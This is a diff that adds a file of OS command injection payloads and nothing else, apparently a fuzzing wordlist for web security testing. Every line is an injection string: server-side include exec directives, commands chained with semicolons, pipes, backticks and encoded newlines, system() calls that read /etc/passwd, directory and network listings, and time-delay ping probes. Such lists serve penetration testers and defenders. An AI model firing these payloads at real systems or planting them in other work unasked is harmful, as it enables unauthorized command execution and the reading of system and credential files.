@@ -1,0 +1,67 @@
+<!--#exec cmd="/test"-->
+/index.html|/test|
+;/test;
+;/test
+;netstat -a;
+;/test;
+|/test
+|/test
+|/test|
+|/test|
+||/test|
+|/test;
+||/test;
+;/test|
+;|/test|
+\n/bin/ls -al\n
+\n/test\n
+\n/test\n
+\n/test;
+\n/test;
+\n/test|
+\n/test|
+;/test\n
+;/test\n
+|/test\n
+|n/test\n
+`/test`
+`/test`
+a);/test
+a;/test
+a);/test;
+a;/test;
+a);/test|
+a;/test|
+a)|/test
+a|/test
+a)|/test;
+a|/test
+|/bin/ls -al
+a);/test
+a;/test
+a);/test;
+a;/test;
+a);/test|
+a;/test|
+a)|/test
+a|/test
+a)|/test;
+a|/test
+;system('cat%20/etc/passwd')
+;system('/test')
+;system('/test')
+%0Acat%20/etc/passwd
+%0A/test
+%0A/test
+%0A/test%0A
+%0A/test%0A
+& ping -i 30 127.0.0.1 &
+& ping -n 30 127.0.0.1 &
+%0a ping -i 30 127.0.0.1 %0a
+`ping 127.0.0.1`
+| /test
+& /test
+; /test
+%0a /test %0a
+`/test`
+$;/test
